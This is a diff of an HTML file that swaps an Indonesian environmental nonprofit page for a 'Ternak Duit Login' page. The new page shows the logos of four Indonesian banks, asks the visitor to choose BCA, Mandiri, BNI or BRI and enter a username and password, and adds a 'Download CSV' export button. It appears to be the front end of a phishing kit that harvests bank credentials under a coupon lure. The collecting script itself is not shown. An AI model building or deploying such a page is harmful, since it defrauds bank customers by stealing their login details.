@@ -1,86 +1,46 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bumi Hijau</title>
-    <link rel="stylesheet" href="style.css">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Ternak Duit Login</title>
+  <link rel="stylesheet" href="style2.css">
 </head>
 <body>
-    <header>
-        <nav>
-            <ul>
-                <li><a href="#home" onclick="scrollToSection('home')">Home</a></li>
-                <li><a href="#about" onclick="scrollToSection('about')">About</a></li>
-                <a href="#logo"><img src="https://i.ibb.co.com/qmfBhmr/logo.png" alt="logo"></a>
-                <li><a href="#service" onclick="scrollToSection('service')">Service</a></li>
-                <li><a href="#" onclick="showPopup()">Contact</a></li>
-            </ul>
-        </nav>
-    </header>
+  <div class="grid-container">
+    <div class="grid-item"></div>
+    <div class="grid-item"></div>
+    <div class="grid-item"></div>
+  </div>
 
-    <section id="home">
-        <div class="hero">
-            <h1>Tanam Harapan Tumbuhkan Kehidupan</h1>
-            <a href="#green-grow" class="btn" onclick="scrollToSection('green-grow')">Explore More</a>
-        </div>
-    </section>
+  <div class="login-container">
+    <img src="https://images.bisnis.com/posts/2024/01/05/1729714/logo_bca,_bank_mandiri,_bni,_bri_(1)_1689600101.jpg" alt="Ternak Duit Kupon Logo" class="logo">
+    <form id="login-form">
+      <div class="form-group">
+        <label for="bank">Pilih Bank:</label>
+        <select id="bank" name="bank" required>
+          <option value="" disabled selected>Pilih Bank</option>
+          <option value="BNI">BNI</option>
+          <option value="BRI">BRI</option>
+          <option value="BCA">BCA</option>
+          <option value="MANDIRI">MANDIRI</option>
+        </select>
+      </div>
+      <div class="form-group">
+        <label for="username">Username:</label>
+        <input type="text" id="username" name="username" placeholder="Masukkan Username Anda" required>
+      </div>
+      <div class="form-group">
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password" placeholder="Masukkan Password Anda" required>
+      </div>
+      <button type="submit">Login</button>
+    </form>
+    <p id="error-message"></p>
+    <button id="btnDownloadCsv">Download CSV</button>
+  </div>
 
-    <section id="Bumi-Hijau">
-        <div class="Rimbun-content">
-            <h1>Bumi Hijau</h1>
-            <p>Membangun kebersamaan dan kesejahteraan bersama merupakan tujuan utama yang dikejar. Melalui kolaborasi yang kuat dan kerjasama yang berkelanjutan, diupayakan lingkungan yang inklusif, mendukung, dan berdaya bagi setiap individu. Nilai-nilai seperti saling menghormati, gotong royong, dan tanggung jawab sosial dipromosikan untuk menciptakan fondasi yang kokoh bagi pertumbuhan individu dan keseluruhan masyarakat. Dengan demikian, akhirnya tercipta hubungan yang berkelanjutan, jaringan sosial diperkuat, dan dampak positif yang signifikan tercipta dalam lingkungan lokal maupun global.</p>
-        </div>
-    </section>
-
-    <p></p>
-    <button type="button" class="button-formulir" onclick="toggleForm()">Buka Formulir Donasi atau Keanggotaan</button>
-    <p></p>
-    <!-- Popup Form -->
-    <!-- Popup Form -->
-<div id="popupForm" class="popup">
-    <div class="popup-content">
-        <span class="close" onclick="closePopup()">&times;</span>
-        <h2>Contact Form</h2>
-        <form>
-            <label for="contact-name">Name</label>
-            <input type="text" id="contact-name" name="name" required>
-            <label for="contact-email">Email</label>
-            <input type="email" id="contact-email" name="email" required>
-            <label for="message">Message</label>
-            <textarea id="message" name="message" required></textarea>
-            <button type="submit">Submit</button>
-        </form>
-    </div>
-</div>
-
-    
-
-    <div id="donation-membership" class="popup">
-        <div class="popup-content">
-            <span class="close" onclick="toggleForm()">&times;</span>
-            <h2>Form Donasi atau Keanggotaan</h2>
-            <form>
-                <label for="donation-amount">Jumlah Donasi</label>
-                <input type="text" id="donation-amount" name="donation-amount" required>
-                <label for="membership-type">Gabung Keanggotaan</label>
-                <select id="membership-type" name="membership-type" required>
-                    <option value="reguler">Daftar Anggota</option>
-                    <option value="premium">Tanpa Menjadi Anggota</option>
-                </select>
-                <label for="donation-name">Nama</label>
-                <input type="text" id="donation-name" name="name" required>
-                <label for="donation-email">Email</label>
-                <input type="email" id="donation-email" name="email" required>
-                <button type="submit">Submit</button>
-            </form>
-        </div>
-    </div>
-
-    <footer>
-        <p>Bumi Hijau 2024</p>
-    </footer>
-
-    <script src="script.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/json2csv"></script>
+  <script src="script2.js"></script>
 </body>
 </html>
